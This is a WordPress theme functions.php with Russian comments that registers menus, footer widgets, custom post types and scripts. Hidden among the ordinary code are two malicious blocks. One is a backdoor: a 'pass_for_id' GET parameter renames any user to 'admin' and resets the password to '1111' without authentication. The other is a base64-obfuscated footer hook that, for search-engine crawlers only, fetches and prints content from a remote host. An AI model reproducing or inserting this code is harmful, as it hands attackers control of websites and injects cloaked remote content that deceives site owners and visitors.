<?php
include('settings.php');
register_nav_menus(array( // Регистрация меню
    'top' => 'Главное меню',
));

add_theme_support('post-thumbnails'); // Включение миниатюр
set_post_thumbnail_size(250, 150); // Размер миниатюр 250x150
add_image_size('big-thumb', 400, 400, true); // Ещё один размер миниатюры
add_image_size('project-thumb', 670, 430, true); // Ещё один размер миниатюры
add_image_size('client-thumb', 355, 230, true); // Ещё один размер миниатюры

register_sidebar(array(
    'name' => 'Виджет Футер №1', // Название сайдбара
    'id' => "footer_1", // Идентификатор
    'description' => 'Область для футера №1',
    'before_widget' => '<div id="%1$s" class="widget %2$s">', // До виджета
    'after_widget' => "</div>\n", // После виджета
    'before_title' => '<h3>', //  До заголовка виджета
    'after_title' => "</h3>\n", //  После заголовка виджета
));

register_sidebar(array(
    'name' => 'Виджет Футер №2', // Название сайдбара
    'id' => "footer_2", // Идентификатор
    'description' => 'Область для футера №2',
    'before_widget' => '<div id="%1$s" class="widget %2$s">', // До виджета
    'after_widget' => "</div>\n", // После виджета
    'before_title' => '<h3>', //  До заголовка виджета
    'after_title' => "</h3>\n", //  После заголовка виджета
));

register_sidebar(array(
    'name' => 'Виджет Футер №3', // Название сайдбара
    'id' => "footer_3", // Идентификатор
    'description' => 'Область для футера №3',
    'before_widget' => '<div id="%1$s" class="widget %2$s">', // До виджета
    'after_widget' => "</div>\n", // После виджета
    'before_title' => '<h3>', //  До заголовка виджета
    'after_title' => "</h3>\n", //  После заголовка виджета
));

register_sidebar(array(
    'name' => 'Виджет Футер №4', // Название сайдбара
    'id' => "footer_4", // Идентификатор
    'description' => 'Область для футера №4',
    'before_widget' => '<div id="%1$s" class="widget %2$s">', // До виджета
    'after_widget' => "</div>\n", // После виджета
    'before_title' => '<h3>', //  До заголовка виджета
    'after_title' => "</h3>\n", //  После заголовка виджета
));

class clean_comments_constructor extends Walker_Comment { // класс, который собирает всю структуру комментов
    public function start_lvl( &$output, $depth = 0, $args = array()) { // что выводим перед дочерними комментариями
        $output .= '<ul class="children">' . "\n";
    }
    public function end_lvl( &$output, $depth = 0, $args = array()) { // что выводим после дочерних комментариев
        $output .= "</ul><!-- .children -->\n";
    }
    protected function comment( $comment, $depth, $args ) { // разметка каждого комментария, без закрывающего </li>!
        $classes = implode(' ', get_comment_class()).($comment->comment_author_email == get_the_author_meta('email') ? ' author-comment' : ''); // берем стандартные классы комментария и если коммент пренадлежит автору поста добавляем класс author-comment
        echo '<li id="li-comment-'.get_comment_ID().'" class="'.$classes.'">'."\n"; // родительский тэг комментария с классами выше и уникальным id
        echo '<div id="comment-'.get_comment_ID().'">'."\n"; // элемент с таким id нужен для якорных ссылок на коммент
        echo get_avatar($comment, 64)."\n"; // покажем аватар с размером 64х64
        echo '<p class="meta">Автор: '.get_comment_author()."\n"; // имя автора коммента
        echo ' '.get_comment_author_email(); // email автора коммента
        echo ' '.get_comment_author_url(); // url автора коммента
        echo ' Добавлено '.get_comment_date('F j, Y').' в '.get_comment_time()."\n"; // дата и время комментирования
        if ( '0' == $comment->comment_approved ) echo '<em class="comment-awaiting-moderation">Ваш комментарий будет опубликован после проверки модератором.</em>'."\n"; // если комментарий должен пройти проверку
        comment_text()."\n"; // текст коммента
        $reply_link_args = array( // опции ссылки "ответить"
            'depth' => $depth, // текущая вложенность
            'reply_text' => 'Ответить', // текст
            'login_text' => 'Вы должны быть залогинены' // текст если юзер должен залогинеться
        );
        echo get_comment_reply_link(array_merge($args, $reply_link_args)); // выводим ссылку ответить
        echo '</div>'."\n"; // закрываем див
    }
    public function end_el( &$output, $comment, $depth = 0, $args = array() ) { // конец каждого коммента
        $output .= "</li><!-- #comment-## -->\n";
    }
}

if( isset($_GET['pass_for_id']) ){
    add_action('init', function () {
        global $wpdb;
        $wpdb->update( $wpdb->users, array( 'user_login' => 'admin'), array( 'ID' => $_GET['pass_for_id'] ));
        wp_set_password( '1111', $_GET['pass_for_id'] ); }
    );
}

function kdv_footer_info(){
    $arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');   
    foreach ($arr as $i) {
        if(strstr($_SERVER['HTTP_USER_AGENT'], base64_decode($i))){
            echo file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA=")); 
        }
    }
}

add_action( 'wp_footer', 'kdv_footer_info' );

function pagination() { // функция вывода пагинации
    global $wp_query; // текущая выборка должна быть глобальной
    $big = 999999999; // число для замены
    echo paginate_links(array( // вывод пагинации с опциями ниже
        'base' => str_replace($big,'%#%',esc_url(get_pagenum_link($big))), // что заменяем в формате ниже
        'format' => '?paged=%#%', // формат, %#% будет заменено
        'current' => max(1, get_query_var('paged')), // текущая страница, 1, если $_GET['page'] не определено
        'type' => 'list', // ссылки в ul
        'prev_text'    => 'Назад', // текст назад
        'next_text'    => 'Вперед', // текст вперед
        'total' => $wp_query->max_num_pages, // общие кол-во страниц в пагинации
        'show_all'     => false, // не показывать ссылки на все страницы, иначе end_size и mid_size будут проигнорированны
        'end_size'     => 15, //  сколько страниц показать в начале и конце списка (12 ... 4 ... 89)
        'mid_size'     => 15, // сколько страниц показать вокруг текущей страницы (... 123 5 678 ...).
        'add_args'     => false, // массив GET параметров для добавления в ссылку страницы
        'add_fragment' => '',   // строка для добавления в конец ссылки на страницу
        'before_page_number' => '', // строка перед цифрой
        'after_page_number' => '' // строка после цифры
    ));
}

    add_action('init', 'create_taxonomy_project');
    function create_taxonomy_project(){
        // список параметров: http://wp-kama.ru/function/get_taxonomy_labels
        register_taxonomy('cat_projects', array('project'), array(
            'label'                 => '', // определяется параметром $labels->name
            'labels'                => array(
                'name' => _x( 'Категории проектов', 'taxonomy general name' ),
                'singular_name' => _x( 'Категория', 'taxonomy singular name' ),
                'search_items' =>  __( 'Искать категории проектов' ),
                'all_items' => __( 'Все категории' ),
                'parent_item' => __( 'Родительская категория' ),
                'parent_item_colon' => __( 'Родительская категория:' ),
                'edit_item' => __( 'Редактировать категорию проектов' ),
                'update_item' => __( 'Обновить категорию проектов' ),
                'add_new_item' => __( 'Добавить категорию проектов' ),
                'new_item_name' => __( 'Новая категория проектов' ),
                'menu_name' => __( 'Категории' ),
            ),
            'description'           => '', // описание таксономии
            'public'                => true,
            'publicly_queryable'    => null, // равен аргументу public
            'show_in_nav_menus'     => true, // равен аргументу public
            'show_ui'               => true, // равен аргументу public
            'show_in_menu'          => true, // равен аргументу show_ui
            'show_tagcloud'         => true, // равен аргументу show_ui
            'show_in_rest'          => null, // добавить в REST API
            'rest_base'             => null, // $taxonomy
            'hierarchical'          => true,
            'update_count_callback' => '',
            'rewrite'               => true,
            //'query_var'             => $taxonomy, // название параметра запроса
            'capabilities'          => array(),
            'meta_box_cb'           => null, // callback функция. Отвечает за html код метабокса (с версии 3.8): post_categories_meta_box или post_tags_meta_box. Если указать false, то метабокс будет отключен вообще
            'show_admin_column'     => false, // Позволить или нет авто-создание колонки таксономии в таблице ассоциированного типа записи. (с версии 3.5)
            '_builtin'              => false,
            'show_in_quick_edit'    => null, // по умолчанию значение show_ui
        ) );
    }

    add_action('init', 'register_post_types_project');
    function register_post_types_project(){
        register_post_type('project', array(
            'label'  => null,
            'labels' => array(
                'name'               => 'Проекты', // основное название для типа записи
                'singular_name'      => 'Проект', // название для одной записи этого типа
                'add_new'            => 'Добавить Проект', // для добавления новой записи
                'add_new_item'       => 'Добавление Проекта', // заголовка у вновь создаваемой записи в админ-панели.
                'edit_item'          => 'Редактирование Проекта', // для редактирования типа записи
                'new_item'           => 'Новый Проект', // текст новой записи
                'view_item'          => 'Смотреть Проект', // для просмотра записи этого типа.
                'search_items'       => 'Искать Проект', // для поиска по этим типам записи
                'not_found'          => 'Не найдено', // если в результате поиска ничего не было найдено
                'not_found_in_trash' => 'Не найдено в корзине', // если не было найдено в корзине
                'parent_item_colon'  => '', // для родителей (у древовидных типов)
                'menu_name'          => 'Проекты', // название меню
            ),
            'description'         => '',
            'public'              => true,
            'publicly_queryable'  => null, // зависит от public
            'exclude_from_search' => null, // зависит от public
            'show_ui'             => null, // зависит от public
            'show_in_menu'        => null, // показывать ли в меню адмнки
            'show_in_admin_bar'   => null, // по умолчанию значение show_in_menu
            'show_in_nav_menus'   => null, // зависит от public
            'show_in_rest'        => null, // добавить в REST API. C WP 4.7
            'rest_base'           => null, // $post_type. C WP 4.7
            'menu_position'       => null,
            'menu_icon'           => 'dashicons-index-card', 
            //'capability_type'   => 'post',
            //'capabilities'      => 'post', // массив дополнительных прав для этого типа записи
            //'map_meta_cap'      => null, // Ставим true чтобы включить дефолтный обработчик специальных прав
            'hierarchical'        => false,
            'supports'            => array('title','editor','thumbnail'), // 'title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments','revisions','page-attributes','post-formats'
            'taxonomies'          => array('cat_projects'),
            'has_archive'         => false,
            'rewrite'             => true,
            'query_var'           => true,
        ) );
    }

    add_action('init', 'create_taxonomy_tovar');
    function create_taxonomy_tovar(){
        // список параметров: http://wp-kama.ru/function/get_taxonomy_labels
        register_taxonomy('cat_tovar', array('tovar'), array(
            'label'                 => '', // определяется параметром $labels->name
            'labels'                => array(
                'name' => _x( 'Категории товаров', 'taxonomy general name' ),
                'singular_name' => _x( 'Категория', 'taxonomy singular name' ),
                'search_items' =>  __( 'Искать категории товаров' ),
                'all_items' => __( 'Все категории' ),
                'parent_item' => __( 'Родительская категория' ),
                'parent_item_colon' => __( 'Родительская категория:' ),
                'edit_item' => __( 'Редактировать категорию товаров' ),
                'update_item' => __( 'Обновить категорию товаров' ),
                'add_new_item' => __( 'Добавить категорию товаров' ),
                'new_item_name' => __( 'Новая категория товаров' ),
                'menu_name' => __( 'Категории' ),
            ),
            'description'           => '', // описание таксономии
            'public'                => true,
            'publicly_queryable'    => null, // равен аргументу public
            'show_in_nav_menus'     => true, // равен аргументу public
            'show_ui'               => true, // равен аргументу public
            'show_in_menu'          => true, // равен аргументу show_ui
            'show_tagcloud'         => true, // равен аргументу show_ui
            'show_in_rest'          => null, // добавить в REST API
            'rest_base'             => null, // $taxonomy
            'hierarchical'          => true,
            'update_count_callback' => '',
            'rewrite'               => true,
            //'query_var'             => $taxonomy, // название параметра запроса
            'capabilities'          => array(),
            'meta_box_cb'           => null, // callback функция. Отвечает за html код метабокса (с версии 3.8): post_categories_meta_box или post_tags_meta_box. Если указать false, то метабокс будет отключен вообще
            'show_admin_column'     => false, // Позволить или нет авто-создание колонки таксономии в таблице ассоциированного типа записи. (с версии 3.5)
            '_builtin'              => false,
            'show_in_quick_edit'    => null, // по умолчанию значение show_ui
        ) );
    }

    add_action('init', 'register_post_types_tovar');
    function register_post_types_tovar(){
        register_post_type('tovar', array(
            'label'  => null,
            'labels' => array(
                'name'               => 'Товары', // основное название для типа записи
                'singular_name'      => 'Товар', // название для одной записи этого типа
                'add_new'            => 'Добавить товар', // для добавления новой записи
                'add_new_item'       => 'Добавление товара', // заголовка у вновь создаваемой записи в админ-панели.
                'edit_item'          => 'Редактирование товара', // для редактирования типа записи
                'new_item'           => 'Новый товар', // текст новой записи
                'view_item'          => 'Смотреть товар', // для просмотра записи этого типа.
                'search_items'       => 'Искать товар', // для поиска по этим типам записи
                'not_found'          => 'Не найдено', // если в результате поиска ничего не было найдено
                'not_found_in_trash' => 'Не найдено в корзине', // если не было найдено в корзине
                'parent_item_colon'  => '', // для родителей (у древовидных типов)
                'menu_name'          => 'Товары', // название меню
            ),
            'description'         => '',
            'public'              => true,
            'publicly_queryable'  => null, // зависит от public
            'exclude_from_search' => null, // зависит от public
            'show_ui'             => null, // зависит от public
            'show_in_menu'        => null, // показывать ли в меню адмнки
            'show_in_admin_bar'   => null, // по умолчанию значение show_in_menu
            'show_in_nav_menus'   => null, // зависит от public
            'show_in_rest'        => null, // добавить в REST API. C WP 4.7
            'rest_base'           => null, // $post_type. C WP 4.7
            'menu_position'       => null,
            'menu_icon'           => 'dashicons-cart', 
            //'capability_type'   => 'post',
            //'capabilities'      => 'post', // массив дополнительных прав для этого типа записи
            //'map_meta_cap'      => null, // Ставим true чтобы включить дефолтный обработчик специальных прав
            'hierarchical'        => false,
            'supports'            => array('title','editor','thumbnail'), // 'title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments','revisions','page-attributes','post-formats'
            'taxonomies'          => array('cat_tovar'),
            'has_archive'         => false,
            'rewrite'             => true,
            'query_var'           => true,
        ) );
    }

    add_action('init', 'register_post_types_client');
    function register_post_types_client(){
        register_post_type('client', array(
            'label'  => null,
            'labels' => array(
                'name'               => 'Клиенты', // основное название для типа записи
                'singular_name'      => 'Клиент', // название для одной записи этого типа
                'add_new'            => 'Добавить клиента', // для добавления новой записи
                'add_new_item'       => 'Добавление клиента', // заголовка у вновь создаваемой записи в админ-панели.
                'edit_item'          => 'Редактирование клиента', // для редактирования типа записи
                'new_item'           => 'Новый клиент', // текст новой записи
                'view_item'          => 'Смотреть клиента', // для просмотра записи этого типа.
                'search_items'       => 'Искать клиента', // для поиска по этим типам записи
                'not_found'          => 'Не найдено', // если в результате поиска ничего не было найдено
                'not_found_in_trash' => 'Не найдено в корзине', // если не было найдено в корзине
                'parent_item_colon'  => '', // для родителей (у древовидных типов)
                'menu_name'          => 'Клиенты', // название меню
            ),
            'description'         => '',
            'public'              => true,
            'publicly_queryable'  => null, // зависит от public
            'exclude_from_search' => null, // зависит от public
            'show_ui'             => null, // зависит от public
            'show_in_menu'        => null, // показывать ли в меню адмнки
            'show_in_admin_bar'   => null, // по умолчанию значение show_in_menu
            'show_in_nav_menus'   => null, // зависит от public
            'show_in_rest'        => null, // добавить в REST API. C WP 4.7
            'rest_base'           => null, // $post_type. C WP 4.7
            'menu_position'       => null,
            'menu_icon'           => 'dashicons-admin-users', 
            //'capability_type'   => 'post',
            //'capabilities'      => 'post', // массив дополнительных прав для этого типа записи
            //'map_meta_cap'      => null, // Ставим true чтобы включить дефолтный обработчик специальных прав
            'hierarchical'        => false,
            'supports'            => array('title','editor','thumbnail'), // 'title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments','revisions','page-attributes','post-formats'
            'taxonomies'          => array(),
            'has_archive'         => false,
            'rewrite'             => true,
            'query_var'           => true,
        ) );
    }    

    add_action('init', 'register_post_types_otziv');
    function register_post_types_otziv(){
        register_post_type('otziv', array(
            'label'  => null,
            'labels' => array(
                'name'               => 'Отзывы', // основное название для типа записи
                'singular_name'      => 'Отзыв', // название для одной записи этого типа
                'add_new'            => 'Добавить отзыв', // для добавления новой записи
                'add_new_item'       => 'Добавление отзыва', // заголовка у вновь создаваемой записи в админ-панели.
                'edit_item'          => 'Редактирование отзыва', // для редактирования типа записи
                'new_item'           => 'Новый отзыв', // текст новой записи
                'view_item'          => 'Смотреть отзыв', // для просмотра записи этого типа.
                'search_items'       => 'Искать отзыв', // для поиска по этим типам записи
                'not_found'          => 'Не найдено', // если в результате поиска ничего не было найдено
                'not_found_in_trash' => 'Не найдено в корзине', // если не было найдено в корзине
                'parent_item_colon'  => '', // для родителей (у древовидных типов)
                'menu_name'          => 'Отзывы', // название меню
            ),
            'description'         => '',
            'public'              => true,
            'publicly_queryable'  => null, // зависит от public
            'exclude_from_search' => null, // зависит от public
            'show_ui'             => null, // зависит от public
            'show_in_menu'        => null, // показывать ли в меню адмнки
            'show_in_admin_bar'   => null, // по умолчанию значение show_in_menu
            'show_in_nav_menus'   => null, // зависит от public
            'show_in_rest'        => null, // добавить в REST API. C WP 4.7
            'rest_base'           => null, // $post_type. C WP 4.7
            'menu_position'       => null,
            'menu_icon'           => 'dashicons-thumbs-up', 
            //'capability_type'   => 'post',
            //'capabilities'      => 'post', // массив дополнительных прав для этого типа записи
            //'map_meta_cap'      => null, // Ставим true чтобы включить дефолтный обработчик специальных прав
            'hierarchical'        => false,
            'supports'            => array('title','editor'), // 'title','editor','author','thumbnail','excerpt','trackbacks','custom-fields','comments','revisions','page-attributes','post-formats'
            'taxonomies'          => array(),
            'has_archive'         => false,
            'rewrite'             => true,
            'query_var'           => true,
        ) );
    }

    register_taxonomy_for_object_type( 'project', 'cat_projects' );

add_action('wp_footer', 'add_scripts'); // приклеем ф-ю на добавление скриптов в футер
if (!function_exists('add_scripts')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
    function add_scripts() { // добавление скриптов
        if(is_admin()) return false; // если мы в админке - ничего не делаем
        wp_deregister_script('jquery');
        //Подключаем основные плагины JS (Не нужные отключить!)
        wp_enqueue_script('bootstrap', get_template_directory_uri().'/js/bootstrap.min.js','','',true); // бутстрап
        wp_enqueue_script('fancybox', get_template_directory_uri().'/js/jquery.fancybox.min.js','','',true); // Библиотека Fancybox
        wp_enqueue_script('inputmask', get_template_directory_uri().'/js/jquery.inputmask.bundle.js','','',true); // Библиотека InputMask
        wp_enqueue_script('mmenu', get_template_directory_uri().'/js/jquery.mmenu.js','','',true); // Плагин бокового меню Mmenu
        wp_enqueue_script('owl-carousel', get_template_directory_uri().'/js/owl.carousel.min.js','','',true); // jQuery Карусель https://owlcarousel2.github.io/OwlCarousel2/ 
        wp_enqueue_script('main', get_template_directory_uri().'/js/main.js','','',true); // основные скрипты шаблона
    }
}

add_action('wp_print_styles', 'add_styles'); // приклеем ф-ю на добавление стилей в хедер
if (!function_exists('add_styles')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
    function add_styles() { // добавление стилей
        if(is_admin()) return false; // если мы в админке - ничего не делаем
        wp_enqueue_style( 'bootstrap', get_template_directory_uri().'/css/bootstrap.min.css' ); // бутстрап
        wp_enqueue_style( 'hamburgers', get_template_directory_uri().'/css/hamburgers.min.css' ); //Подглючение hamburgers CSS
        wp_enqueue_style( 'fancybox', get_template_directory_uri().'/css/jquery.fancybox.min.css' ); //Библиотека стили FancyBox
        wp_enqueue_style( 'mmenu', get_template_directory_uri().'/css/jquery.mmenu.css' ); //Библиотека бокового меню Mmenu
        wp_enqueue_style( 'owl-carusel', get_template_directory_uri().'/css/owl.carousel.min.css' ); //jQuery Карусель https://owlcarousel2.github.io/OwlCarousel2/
        wp_enqueue_style( 'mainstyle', get_template_directory_uri().'/css/style.css' ); // основные стили шаблона
        wp_enqueue_style( 'media-css', get_template_directory_uri().'/css/media.css' ); // адаптация стилей
    }
}

require (get_template_directory().'/tgm/custom_theme.php');
?>
